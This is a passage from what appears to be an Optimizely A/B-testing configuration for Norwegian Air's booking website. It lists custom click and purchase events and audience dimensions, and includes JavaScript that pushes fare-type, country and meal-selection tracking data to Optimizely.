              "id": "22913000167",
              "viewId": null,
              "name": "Clicks on Popup: Cancel",
              "category": "other",
              "apiName": "Clicks_on_Popup_Cancel",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23017790659",
              "viewId": null,
              "name": "Clicks on Continue to next Page",
              "category": "other",
              "apiName": "Clicks_on_Continue_to_next_Page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23066890084",
              "viewId": null,
              "name": "Total clicks on Velg",
              "category": "other",
              "apiName": "Total_clicks_on_Velg",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23076750065",
              "viewId": null,
              "name": "Add to cart: Lowfare",
              "category": "other",
              "apiName": "Add_to_cart_Lowfare",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23078450080",
              "viewId": null,
              "name": "Add to cart: LowfarePlus",
              "category": "other",
              "apiName": "Add_to_cart_LowfarePlus",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23080290061",
              "viewId": null,
              "name": "Add to cart: Flex",
              "category": "other",
              "apiName": "Add_to_cart_Flex",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23084000121",
              "viewId": null,
              "name": "Clicks on See Details",
              "category": "other",
              "apiName": "Clicks_on_See_Details",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23084740058",
              "viewId": null,
              "name": "Clicks on CTA for LowfarePlus",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_LowfarePlus",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23090260048",
              "viewId": null,
              "name": "Clicks on CTA for Flex",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Flex",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23105440032",
              "viewId": null,
              "name": "Clicks on CTA for Lowfare",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Lowfare",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23468521902",
              "viewId": null,
              "name": "Clicks_on_a_Destination_box",
              "category": "other",
              "apiName": "Clicks_on_a_Destination_box",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23472790988",
              "viewId": null,
              "name": "Clicks_on_Categories",
              "category": "other",
              "apiName": "Clicks_on_Categories",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23484350063",
              "viewId": null,
              "name": "Clicks on Log in",
              "category": "other",
              "apiName": "Clicks_on_Log_in",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23499040017",
              "viewId": null,
              "name": "Clicks on Continue as guest",
              "category": "other",
              "apiName": "Clicks_on_Continue_as_guest",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23506950072",
              "viewId": null,
              "name": "Users log in",
              "category": "other",
              "apiName": "Users_log_in",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23508990918",
              "viewId": null,
              "name": "Clicks_on_months",
              "category": "other",
              "apiName": "Clicks_on_months",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23520930012",
              "viewId": null,
              "name": "Continue to next step",
              "category": "other",
              "apiName": "Continue_to_next_step",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23575190144",
              "viewId": null,
              "name": "Clicks_on_Direct_w_Stop_box",
              "category": "other",
              "apiName": "Clicks_on_Direct_w_Stop_box",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23663121241",
              "viewId": null,
              "name": "Clicks on CTA for Tickets with limited seats ",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Tickets_with_limited_seats",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23707760522",
              "viewId": null,
              "name": "Clicks on CTA for Tickets not with limited seats",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Tickets_not_with_limited_seats",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23745260732",
              "viewId": null,
              "name": "Clicks on a date in calendar",
              "category": "other",
              "apiName": "Clicks_on_a_date_in_calendar",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23763240439",
              "viewId": null,
              "name": "Clicks on Continue to Bestilling T120",
              "category": "other",
              "apiName": "Clicks_on_Continue_to_Bestilling",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23878582195",
              "viewId": null,
              "name": "Clicks on CTA for Find reservasjon",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Find_reservasjon",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23899635129",
              "viewId": null,
              "name": "Clicks on Registrer Profile",
              "category": "other",
              "apiName": "Clicks_on_Registrer_Profile",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23914091054",
              "viewId": null,
              "name": "Clicks on Continue to next Page T118",
              "category": "other",
              "apiName": "Click_on_Continue_to_next_Page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23932831204",
              "viewId": null,
              "name": "Clicks on CTA for Login",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Login",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "23993461202",
              "viewId": null,
              "name": "Clicks on continue lowfare cal",
              "category": "other",
              "apiName": "Clicks_on_continue_lowfare_cal",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24031380711",
              "viewId": null,
              "name": "Clicks on sticky banner",
              "category": "other",
              "apiName": "Clicks_on_sticky_banner",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24118500754",
              "viewId": null,
              "name": "Click to open departure",
              "category": "other",
              "apiName": "Click_to_open_departure",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24218740886",
              "viewId": null,
              "name": "Clicks on CTA for VIPPS/Swish",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_VIPPS_Swish",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24223251542",
              "viewId": null,
              "name": "Clicks on CTA for Klarna Split payment",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Klarna_Split_payment",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24270390152",
              "viewId": null,
              "name": "Clicks on CTA for Trustly",
              "category": "other",
              "apiName": "Clicks_on_CTAfor_Trustly",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24282380034",
              "viewId": null,
              "name": "Clicks on CTA for Credit card",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Credit_card",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24298450317",
              "viewId": null,
              "name": "Clicks on any CTA on payment ",
              "category": "other",
              "apiName": "Clicks_on_any_CTA_on_payment",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24306580663",
              "viewId": null,
              "name": "Clicks on expand Credit card",
              "category": "other",
              "apiName": "Clicks_on_expand_Creditcard",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24319310465",
              "viewId": null,
              "name": "Clicks on CTA for Klarna Pay later",
              "category": "other",
              "apiName": "Clicks_on_CTA_for_Klarna_Pay_later",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24321590543",
              "viewId": "24311260614",
              "name": "Red link read more - menu/food on board",
              "category": "other",
              "apiName": "17273916855_red_link_read_more__menufood_on_board",
              "eventType": "click",
              "eventFilter": {
                "filterType": "target_selector",
                "selector": ".mealsalesreadmore a"
              }
            }, {
              "id": "24347020392",
              "viewId": null,
              "name": "Clicks on expand Trustly",
              "category": "other",
              "apiName": "Clicks_on_expand_Trustly",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24353570192",
              "viewId": "24311260614",
              "name": "Red CTA - continue",
              "category": "other",
              "apiName": "17273916855_red_cta__continue",
              "eventType": "click",
              "eventFilter": {
                "filterType": "target_selector",
                "selector": "#ctl00_MainContent_ipcResMakeMeal_ipcContinueButtonBar_lnkContinue"
              }
            }, {
              "id": "24401941298",
              "viewId": null,
              "name": "Clicks on main CTA",
              "category": "other",
              "apiName": "Clicks_on_main_CTA",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24404011528",
              "viewId": null,
              "name": "Clicks on background image ",
              "category": "other",
              "apiName": "Clicks_on_background_image",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24406420548",
              "viewId": null,
              "name": "select_meal",
              "category": "other",
              "apiName": "select_meal",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24434840508",
              "viewId": null,
              "name": "continue_lowfare",
              "category": "other",
              "apiName": "continue_lowfare",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24436980195",
              "viewId": null,
              "name": "added_meal",
              "category": "other",
              "apiName": "added_meal",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24439071152",
              "viewId": null,
              "name": "Clicks on Article link",
              "category": "other",
              "apiName": "Clicks_on_Article_link",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24441880837",
              "viewId": null,
              "name": "Clicks on month arrows",
              "category": "other",
              "apiName": "Clicks_on_month_arrows",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24457300369",
              "viewId": null,
              "name": "Click on blue tabs",
              "category": "other",
              "apiName": "Click_on_blue_tabs",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24518341544",
              "viewId": null,
              "name": "Clicks on a date in the calendar",
              "category": "other",
              "apiName": "Clicks_on_a_date_in_the_calendar",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24606791193",
              "viewId": null,
              "name": "Clicks on new summary element",
              "category": "other",
              "apiName": "Clicks_on_new_summary_element",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24690880441",
              "viewId": null,
              "name": "Clicks on Edit code - Destinations page",
              "category": "other",
              "apiName": "Clicks_on_Edit_code-Destinations page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24690920632",
              "viewId": null,
              "name": "Clicks on Jobbreiser",
              "category": "other",
              "apiName": "Clicks_on_Jobbreiser",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24698750006",
              "viewId": null,
              "name": "Clicks on main CTA \u201cS\u00f8k og bestill\u201d",
              "category": "other",
              "apiName": "Clicks_on_main_CTA_Sok_og_bestill",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24703750044",
              "viewId": null,
              "name": "Click on Reward",
              "category": "other",
              "apiName": "Click_on_Reward",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24718170008",
              "viewId": null,
              "name": "Click on Leiebil",
              "category": "other",
              "apiName": "Click_on_Leiebil",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24719570012",
              "viewId": null,
              "name": "Click on Fly+Hotell",
              "category": "other",
              "apiName": "Click_on_Fly_Hotell",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24721430691",
              "viewId": null,
              "name": "Click to next page - Avaday ",
              "category": "other",
              "apiName": "Click_to_next_page_Avaday",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24731130408",
              "viewId": null,
              "name": "Clicks on any departure  - Campaign page",
              "category": "other",
              "apiName": "Clicks_on_any_departure-Campaign page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24731270026",
              "viewId": null,
              "name": "Click on Hotel",
              "category": "other",
              "apiName": "Click_on_Hotel",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24733730027",
              "viewId": null,
              "name": "Clicks on Ungdsombiljett",
              "category": "other",
              "apiName": "Clicks_on_Ungdsombiljett",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24745910379",
              "viewId": null,
              "name": "Clicks on any departure  - Destinations page",
              "category": "other",
              "apiName": "Clicks_on_any_departure-Destinations page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24761070290",
              "viewId": null,
              "name": "Clicks on CTA in popup - Campaign page",
              "category": "other",
              "apiName": "Clicks_on_CTA_in_popup-Campaign page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24764800803",
              "viewId": null,
              "name": "Clicks on Abandoned cart",
              "category": "other",
              "apiName": "Clicks_on_Abandoned_cart",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24769220265",
              "viewId": null,
              "name": "Clicks on Activate code - Destinations page",
              "category": "other",
              "apiName": "Clicks_on_Activate_code-Destinations page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24785010159",
              "viewId": null,
              "name": "Clicks on CTA in popup - Destinations page",
              "category": "other",
              "apiName": "Clicks_on_CTA_in_popup-Destinations page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24799170852",
              "viewId": null,
              "name": "Clicks on checkbox LowPrice Calendar",
              "category": "other",
              "apiName": "Clicks_on_checkbox_LowPrice_Calendar",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "24812210094",
              "viewId": null,
              "name": "Clicks on Main CTA in Search",
              "category": "other",
              "apiName": "Clicks_on_Main_CTA_in_Search",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "25061970358",
              "viewId": null,
              "name": "clicks on Cheapest tickets ",
              "category": "other",
              "apiName": "clicks_on_Cheapest_tickets",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "25234530156",
              "viewId": null,
              "name": "Click on expand Klarna Split ",
              "category": "other",
              "apiName": "Click_on_expand_Klarna_Split",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "25237471057",
              "viewId": null,
              "name": "Clicks on Direct Flight filter",
              "category": "other",
              "apiName": "Clicks_on_Direct_Flight_filter",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "25238001573",
              "viewId": null,
              "name": "Clicks on Continue CTA - Avaday",
              "category": "other",
              "apiName": "Clicks_on_Continue_CTA_Avaday",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "25239851330",
              "viewId": null,
              "name": "Clicks on Months/Arrow elements",
              "category": "other",
              "apiName": "Clicks_on_Months_Arrow_elements",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "25261200161",
              "viewId": null,
              "name": "Click on expand Klarna",
              "category": "other",
              "apiName": "Click_on_expand_Klarna",
              "eventType": "custom",
              "eventFilter": null
            }],
            "dimensions": [{
              "id": "17530831927",
              "name": "aftersale_purchasedLowFare",
              "apiName": "aftersale_purchasedLowFare",
              "segmentId": null
            }, {
              "id": "17540702300",
              "name": "aftersale_purchasedPrioBoarding",
              "apiName": "aftersale_purchasedPrioBoarding",
              "segmentId": null
            }, {
              "id": "17546291642",
              "name": "booking_purchasedPremiumFlex",
              "apiName": "booking_purchasedPremiumFlex",
              "segmentId": null
            }, {
              "id": "17546321024",
              "name": "aftersale_purchasedLowFarePlus",
              "apiName": "aftersale_purchasedLowFarePlus",
              "segmentId": null
            }, {
              "id": "17550191077",
              "name": "booking_purchasedLuggage",
              "apiName": "booking_purchasedLuggage",
              "segmentId": null
            }, {
              "id": "17552060974",
              "name": "booking_purchasedLowFare",
              "apiName": "booking_purchasedLowFare",
              "segmentId": null
            }, {
              "id": "17553641628",
              "name": "booking_purchasedSeating",
              "apiName": "booking_purchasedSeating",
              "segmentId": null
            }, {
              "id": "17554011788",
              "name": "booking_purchasedPremium",
              "apiName": "booking_purchasedPremium",
              "segmentId": null
            }, {
              "id": "17555681305",
              "name": "aftersale_purchasedLowFareFlex",
              "apiName": "aftersale_purchasedLowFareFlex",
              "segmentId": null
            }, {
              "id": "17557411391",
              "name": "aftersale_purchasedMeal",
              "apiName": "aftersale_purchasedMeal",
              "segmentId": null
            }, {
              "id": "17557791644",
              "name": "booking_purchasedMeal",
              "apiName": "booking_purchasedMeal",
              "segmentId": null
            }, {
              "id": "17557802480",
              "name": "aftersale_purchasedSeating",
              "apiName": "aftersale_purchasedSeating",
              "segmentId": null
            }, {
              "id": "17557852289",
              "name": "aftersale_purchasedFastTrack",
              "apiName": "aftersale_purchasedFastTrack",
              "segmentId": null
            }, {
              "id": "17559661976",
              "name": "booking_purchasedHandLuggage",
              "apiName": "booking_purchasedHandLuggage",
              "segmentId": null
            }, {
              "id": "17559900960",
              "name": "logged-in",
              "apiName": "logged-in",
              "segmentId": null
            }, {
              "id": "17561790810",
              "name": "aftersale_purchasedSportsEquipment",
              "apiName": "aftersale_purchasedSportsEquipment",
              "segmentId": null
            }, {
              "id": "17561871188",
              "name": "booking_purchasedPrioBoarding",
              "apiName": "booking_purchasedPrioBoarding",
              "segmentId": null
            }, {
              "id": "17563352040",
              "name": "booking_purchasedCancellationProtection",
              "apiName": "booking_purchasedCancellationProtection",
              "segmentId": null
            }, {
              "id": "17565471213",
              "name": "aftersale_purchasedHandLuggage",
              "apiName": "aftersale_purchasedHandLuggage",
              "segmentId": null
            }, {
              "id": "17571640863",
              "name": "aftersale_purchasedPremiumFlex",
              "apiName": "aftersale_purchasedPremiumFlex",
              "segmentId": null
            }, {
              "id": "17571711209",
              "name": "booking_purchasedFastTrack",
              "apiName": "booking_purchasedFastTrack",
              "segmentId": null
            }, {
              "id": "17575021605",
              "name": "booking_purchasedLowFarePlus",
              "apiName": "booking_purchasedLowFarePlus",
              "segmentId": null
            }, {
              "id": "17577071595",
              "name": "aftersale_purchasedCancellationProtection",
              "apiName": "aftersale_purchasedCancellationProtection",
              "segmentId": null
            }, {
              "id": "17579011610",
              "name": "aftersale_purchasedPremium",
              "apiName": "aftersale_purchasedPremium",
              "segmentId": null
            }, {
              "id": "17579061306",
              "name": "booking_purchasedSportsEquipment",
              "apiName": "booking_purchasedSportsEquipment",
              "segmentId": null
            }, {
              "id": "17579081283",
              "name": "aftersale_purchasedLuggage",
              "apiName": "aftersale_purchasedLuggage",
              "segmentId": null
            }, {
              "id": "17581440792",
              "name": "booking_purchasedLowFareFlex",
              "apiName": "booking_purchasedLowFareFlex",
              "segmentId": null
            }, {
              "id": "20894374729",
              "name": "lowFareFlex",
              "apiName": "lowFareFlex_TA",
              "segmentId": null
            }, {
              "id": "20896723893",
              "name": "lowFare",
              "apiName": "lowFare_TA",
              "segmentId": null
            }, {
              "id": "20905884744",
              "name": "lowFarePlus",
              "apiName": "lowFarePlus_TA",
              "segmentId": null
            }, {
              "id": "21097921291",
              "name": "Country",
              "apiName": "CountryName",
              "segmentId": null
            }, {
              "id": "21184260617",
              "name": "LowFare Complete Transaction",
              "apiName": "lowFareCompleteTransaction",
              "segmentId": null
            }, {
              "id": "21199171108",
              "name": "LowFarePlus Complete Transaction",
              "apiName": "lowFarePlusCompleteTransaction",
              "segmentId": null
            }, {
              "id": "21219150182",
              "name": "LowFareFlex Complete Transaction",
              "apiName": "flexCompleteTransaction",
              "segmentId": null
            }],
            "projectJS": function () {
              window.onload = optTrack();
              function optTrack() {
                if (dataLayer) {
                  var loginState = Boolean(dataLayer[0].userId);
                  window.optimizely = window.optimizely || [];
                  window.optimizely.push({
                    "type": "user",
                    "attributes": {
                      'logged-in': loginState
                    }
                  });
                  if (loginState) {
                    window.optimizely.push({
                      "type": "event",
                      "eventName": "logins"
                    });
                  }
                }
              }
              /* NOR- TICKET AUDIENCE START FOR PAX PAGE WITHOUT SESSION STORAGE */

              if (window.location.pathname.indexOf('/ipc/resmake/pax') != -1 || window.location.pathname.indexOf('/ipr/Booking#/pax') != -1) {
                function atleastLowFareTracking() {
                  for (let i = 0; i < dataLayer.length; i++) {
                    if (dataLayer[i].event == 'checkout') {
                      for (let a = 0; a < dataLayer[i].ecommerce.checkout.products.length; a++) {
                        var fareType = dataLayer[i].ecommerce.checkout.products[a].dimension38;
                        if (fareType == 'StandardLowFare') {
                          window.optimizely = window.optimizely || [];
                          window.optimizely.push({
                            "type": "user",
                            "attributes": {
                              'lowFare_TA': 1
                            }
                          });
                        }
                        console.log(fareType);
                      }
                    }
                  }
                }
                atleastLowFareTracking();
              }
              /* NOR- TICKET AUDIENCE START */
              (function () {
                console.log('NOR- TICKET AUDIENCE');
                var oldState = window.history.pushState;
                window.history.pushState = function () {
                  console.log('inside global history');
                  try {
                    console.log('inside try');
                    oldState.apply(this, arguments);
                    checkCookie();
                  } catch (e) {
                    console.log('inside catch');
                    console.log(e);
                  }
                };
                window.addEventListener('popstate', function () {
                  checkCookie();
                });
                function waitUntil(predicate, success) {
                  var int = setInterval(function () {
                    if (predicate()) {
                      clearInterval(int);
                      int = null;
                      success();
                    }
                  }, 500);
                }
                function pushSelectTicket(lowFare = 0, lowFarePlus = 0, lowFareFlex = 0) {
                  //function parameters boolean only
                  console.log({
                    lowFare,
                    lowFarePlus,
                    lowFareFlex
                  });
                  window.optimizely = window.optimizely || [];
                  window.optimizely.push({
                    "type": "user",
                    "attributes": {
                      'lowFare_TA': lowFare,
                      'lowFarePlus_TA': lowFarePlus,
                      'lowFareFlex_TA': lowFareFlex
                    }
                  });
                }
                function ticketAudience() {
                  var len = JSON.parse(window.sessionStorage.getItem('ngStorage-difselection')).routes.length;
                  var lowFare = 0;
                  var lowFarePlus = 0;
                  var lowFareFlex = 0;
                  var fareType = '';
                  for (i = 0; i < len; i++) {
                    if (JSON.parse(window.sessionStorage.getItem('ngStorage-difselection')).routes[i].isLowFarePlusSelected || JSON.parse(window.sessionStorage.getItem('ngStorage-difselection'))['routes'][i].selectedFare.type === 'StandardLowFarePlus') {
                      fareType = 'lowFarePlus';
                      console.log(fareType);
                    } else if (JSON.parse(window.sessionStorage.getItem('ngStorage-difselection')).routes[i].isLowFareSelected || JSON.parse(window.sessionStorage.getItem('ngStorage-difselection'))['routes'][i].selectedFare.type === 'StandardLowFare') {
                      fareType = 'lowFare';
                    } else {
                      fareType = 'flex';
                    }
                    if (fareType == 'lowFare') {
                      lowFare = 1;
                      console.log(lowFare);
                    } else if (fareType == 'lowFarePlus') {
                      lowFarePlus = 1;
                      console.log(lowFarePlus);
                    } else if (fareType == 'flex') {
                      lowFareFlex = 1;
                      console.log(lowFareFlex);
                    }
                  }
                  pushSelectTicket(lowFare, lowFarePlus, lowFareFlex);
                }
                function checkCookie() {
                  if (window.location.href.indexOf('/seating') != -1 && !window.ticketAudience) {
                    waitUntil(function () {
                      return window.sessionStorage.getItem('ngStorage-difselection') !== null && JSON.parse(window.sessionStorage.getItem('ngStorage-difselection'))['routes'] !== null;
                    }, function () {
                      window.ticketAudience = 'true';
                      ticketAudience();
                    });
                  }
                }
                checkCookie();
              })();
              /* NOR- TICKET AUDIENCE STOP */

              /*  NOR- COUNTRY TRACKING STARTS */
              (function () {
                console.log('NOR COUNTRY NAME');
                function CountryNameTracking(label) {
                  window.optimizely = window.optimizely || [];
                  window.optimizely.push({
                    "type": "user",
                    "attributes": {
                      "CountryName": label
                    }
                  });
                }
                if (window.location.href.indexOf('/se/') == -1) {
                  // console.log('Sweden');
                  CountryNameTracking('Sweden');
                }
                if (window.location.href.indexOf('/dk/') == -1) {
                  // console.log('Denmark');
                  CountryNameTracking('Denmark');
                }
                var host = location.hostname.replace('www.norwegian.', '');
                if (host == 'no') {
                  // console.log('Norway');
                  host = location.pathname.split('/')[1];
                  CountryNameTracking('Norway');
                }
              })();
              /*  NOR- COUNTRY TRACKING STOPS */

              /* NOR- TRACK LOWFARE PLUS USERS CONVERTED STARTS */
              (function () {
                console.log('NOR- TRACK LOWFARE PLUS USERS CONVERTED STARTS');
                function trackCustomAttrNOR68_lowFarePlus(customAttr, nameOfEvent) {
                  window['optimizely'] = window['optimizely'] || [];
                  window['optimizely'].push({
                    type: "event",
                    eventName: nameOfEvent,
                    attributes: {
                      "lowFarePlusCompleteTransaction": customAttr
                    }
                  });
                }
                function trackCustomAttrNOR68_lowFare(customAttr, nameOfEvent) {
                  window['optimizely'] = window['optimizely'] || [];
                  window['optimizely'].push({
                    type: "event",
                    eventName: nameOfEvent,
                    attributes: {
                      "lowFareCompleteTransaction": customAttr
                    }
                  });
                }
                function trackCustomAttrNOR68_lowFareFlex(customAttr, nameOfEvent) {
                  window['optimizely'] = window['optimizely'] || [];
                  window['optimizely'].push({
                    type: "event",
                    eventName: nameOfEvent,
                    attributes: {
                      "flexCompleteTransaction": customAttr
                    }
                  });
                }
                function iterateNOR68(obj, data) {
                  Object.keys(obj).forEach(function (key) {
                    if (key === "products") {
                      data['products'] = obj[key];
                      return;
                    }
                    if (obj[key] !== null && typeof obj[key] === 'object') {
                      iterateNOR68(obj[key], data);
                    }
                  });
                }
                if (window.location.href.includes('/ipc/resmake/receipt')) {
                  var nor68Data = {};
                  dataLayer = dataLayer || [];
                  iterateNOR68(dataLayer, nor68Data);
                  var lowFareTickets = 0,
                    lowFarePlusTickets = 0,
                    lowFareFlexTickets = 0;
                  nor68Data['products'].forEach(function (val) {
                    if (val.price && val.dimension38 && val.price !== '0.00' && val.dimension38 === 'StandardLowFarePlus') {
                      lowFarePlusTickets++;
                    } else if (val.price && val.dimension38 && val.price !== '0.00' && val.dimension38 === 'StandardLowFare') {
                      lowFareTickets++;
                    } else if (val.price && val.dimension38 && val.price !== '0.00' && val.dimension38 === 'StandardFlex') {
                      lowFareFlexTickets++;
                    }
                  });
                  if (lowFareTickets === 1) {
                    trackCustomAttrNOR68_lowFare("Single Side purchase", "totalLowFare");
                  } else if (lowFareTickets === 2) {
                    trackCustomAttrNOR68_lowFare("Both Side purchase", "totalLowFare");
                  }
                  if (lowFarePlusTickets === 1) {
                    trackCustomAttrNOR68_lowFarePlus("Single Side purchase", "totalLowFarePlus");
                  } else if (lowFarePlusTickets === 2) {
                    trackCustomAttrNOR68_lowFarePlus("Both Side purchase", "totalLowFarePlus");
                  }
                  if (lowFareFlexTickets === 1) {
                    trackCustomAttrNOR68_lowFareFlex("Single Side purchase", "lowFareFlex");
                  } else if (lowFareFlexTickets === 2) {
                    trackCustomAttrNOR68_lowFareFlex("Both Side purchase", "lowFareFlex");
                  }
                }
              })();

              /* NOR- TRACK LOWFARE PLUS USERS CONVERTED ENDS */

              /* Metric for selected meal - add to cart, desktop only */

              if (window.location.href.includes('/ipc/resmake/nonair')) {
                for (i = 0; i < dataLayer[1].ecommerce.checkout.products.length; i++) {
                  if (dataLayer[1].ecommerce.checkout.products[i].category.match('MEAL')) {
                    window.optimizely.push({
                      type: 'event',
                      eventName: 'added_meal'
                    });
                  }
                }
              }
              /* Metric for selected meal - add to cart, desktop only ends*/

              /* Metric for selected meal in dropdown, desktop only*/
              if (window.location.href.indexOf('/ipc/resmake/meal') > -1) {
                window.addEventListener('DOMContentLoaded', function () {
                  document.querySelector('[id*="ipcMealPurchaseBox"]').addEventListener('change', function () {
                    window.optimizely.push({
                      type: 'event',
                      eventName: 'select_meal'
                    });
                  });
                });
              }
              /* Metric for selected meal in dropdown, desktop only ends*/

              /* Meal selected mobile */
              if (window.location.href.indexOf("/ipr/Booking#/meal") > -1) {
                window.addEventListener("DOMContentLoaded", function () {
                  document.querySelector('[id^="meal"]').addEventListener('change', function () {
                    window.optimizely.push({
                      type: "event",
                      eventName: "select_meal"
                    });
                  });
                });
              }
              /* Meal selected mobile */

              /* Meal added mobile */
              if (window.location.href.includes('/ipr/Booking#/ancillaries')) {
                for (i = 0; i < dataLayer[38].ecommerce.checkout.products.length; i++) {
                  if (dataLayer[38].ecommerce.checkout.products[i].category.match('MEAL')) {
                    window.optimizely.push({
                      type: 'event',
                      eventName: 'added_meal'
                    });
                  }
                }
              }
              /* Meal added mobile */

              /* Click continue CTA at lowfare calendar */
              /* eslint-disable no-var */
              (function LowfareCtaClick() {
                // Function For WaitUntil
                function waitUntil(predicate, success, error) {
                  var int = setInterval(() => {
                    if (predicate()) {
                      clearInterval(int);
                      int = null;
                      success();
                    }
                  }, 33);
                  setTimeout(() => {
                    if (int !== null) {
                      clearInterval(int);
                      if (typeof error === 'function') {
                        error();
                      }
                    }
                  }, 5000);
                }
                function trackingEventGlobal(evtname) {
                  window.optimizely = window.optimizely || [];
                  window.optimizely.push({
                    type: 'event',
                    eventName: evtname
                  });
                }
                // On Low Price calendar - Clicks on “continue”  CTA
                waitUntil(() => (window.location.href.indexOf('/lavpriskalender/') > -1 || window.location.href.indexOf('/lagpriskalender/') > -1) && document.querySelectorAll('button#nas-continue-action-0').length > 0, () => {
                  console.log('LowPrice Calendar | Global Goals');
                  document.querySelector('button#nas-continue-action-0').addEventListener('mousedown', eve => {
                    if (!eve.target.getAttribute('disabled')) {
                      console.log('On Low Price calendar - Clicks on “continue”  CTA');
                      trackingEventGlobal('Clicks_on_continue_lowfare_cal');
                    }
                  });
                });
              })();

              /* Click continue CTA at Avaday Starts For Mobile and Desktop*/
              (function AvadayCTAClick() {
                function waitUntil(predicate, success, error) {
                  var int = setInterval(() => {
                    if (predicate()) {
                      clearInterval(int);
                      int = null;
                      success();
                    }
                  }, 33);
                  setTimeout(() => {
                    if (int !== null) {
                      clearInterval(int);
                      if (typeof error === 'function') {
                        error();
                      }
                    }
                  }, 5000);
                }
                function trackingEventGlobal(evtname) {
                  window.optimizely = window.optimizely || [];
                  window.optimizely.push({
                    type: 'event',
                    eventName: evtname
                  });
                }
                // NEW DELEGATE
                const selectorMatches = function (el, selector) {
                  const p = Element.prototype;
                  let f = p.matches || p.webkitMatchesSelector || p.mozMatchesSelector || p.msMatchesSelector;
                  if (f === undefined) {
                    f = [].indexOf.call(document.querySelectorAll(selector), this) !== -1;
                  }
                  return f.call(el, selector);
                };
                const bindClickDom = function (selector, handler) {
                  document.addEventListener('click', e => {
                    const doc = window.document;
                    // eslint-disable-next-line prefer-destructuring
                    for (let target = e.target; target && target !== doc; target = target.parentNode) {
                      // loop parent nodes from the target to the delegation node
                      if (selectorMatches(target, selector)) {
                        handler.call(target, e);
                        break;
                      }
                    }
                  }, false);
                };
                function clickonAVadayCta() {
                  // Desktop Bottom Button
                  if (document.querySelectorAll('#ctl00_MainContent_ipcAvaDay_lbtContinue').length > 0) {
                    document.querySelector('#ctl00_MainContent_ipcAvaDay_lbtContinue').addEventListener('click', () => {
                      trackingEventGlobal('Clicks_on_Continue_CTA_Avaday');
                    });
